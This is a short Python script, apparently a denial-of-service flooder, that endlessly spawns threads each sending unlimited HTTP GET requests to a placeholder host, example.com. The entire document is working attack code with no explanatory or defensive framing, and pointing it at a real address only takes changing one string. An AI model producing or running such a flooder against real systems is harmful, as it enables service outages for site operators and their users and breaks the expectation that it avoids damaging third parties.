import requests
import threading

def DoS():
    while True:
        requests.get("http://example.com/")

while True:
    threading.Thread(target=DoS).start()